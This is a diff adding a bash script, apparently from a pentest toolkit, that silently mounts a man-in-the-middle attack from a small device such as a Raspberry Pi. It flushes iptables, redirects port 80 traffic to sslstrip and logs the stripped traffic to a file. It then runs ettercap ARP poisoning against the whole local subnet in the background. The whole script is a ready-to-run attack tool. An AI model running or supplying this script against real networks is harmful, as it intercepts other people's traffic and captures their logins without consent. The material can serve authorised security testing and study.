@@ -1,0 +1,62 @@
+#!/bin/bash
+#
+# bash script for silent MITM
+# Derived from YAMAS version 0.9 by comaX
+# Requires sslstrip and ettercap
+# Used in embedded systems(R-Pi, Odiroid)
+#
+# Report any issues to A'mmer Almadani <mad_dev@linuxmail.org>
+
+echo 'Silent MITM'
+echo 'Derived from YAMAS version 0.9 by comaX'
+echo 'This CP should close after everything is set'
+echo 'The goes for smitm-stop' 
+sleep 5 #sleep 50 @ /etc/init.d/SMITM
+	 #Faced issues without sleep 60
+
+#Important
+killall sslstrip #if you still get an error; port already in use
+killall ettercap #run lsof -i and check which process is using that port
+
+#ip_forwarding stop and start
+echo "0" > /proc/sys/net/ipv4/ip_forward
+echo "1" > /proc/sys/net/ipv4/ip_forward
+
+#Reset
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+
+#default destination port is 80
+des_port=80
+#default redirect port is 8080
+re_port=8080
+
+#setting iptables
+iptables -t nat -A PREROUTING -p tcp --destination-port $des_port -j REDIRECT --to-port $re_port
+iptables -A FORWARD -j ACCEPT
+
+file=$(date '+%Y-%m-%d-%H-%M-%S')
+path=penbang/netkit/SMITM/watch
+
+#sslstrip defualt output path is /home/USER/penbang/netkit/SMITM/watch
+nohup sslstrip -a -k -l $re_port -w $path/$file.txt &
+
+#sslstrip needs to start
+sleep 5
+
+#get interface
+iface=$(ip route show | awk '(NR == 1) { print $5}')
+
+#get gateway
+gateway=$(ip route show | awk '(NR == 1) { print $3}')
+
+sleep 5
+
+#start ettercap. Add -D for daemon
+nohup ettercap -D -o -q -i $iface -T -M arp  // // &
+
+#start arpspoof
+#nohup arpspoof -i $iface $gateway &
+exit 0
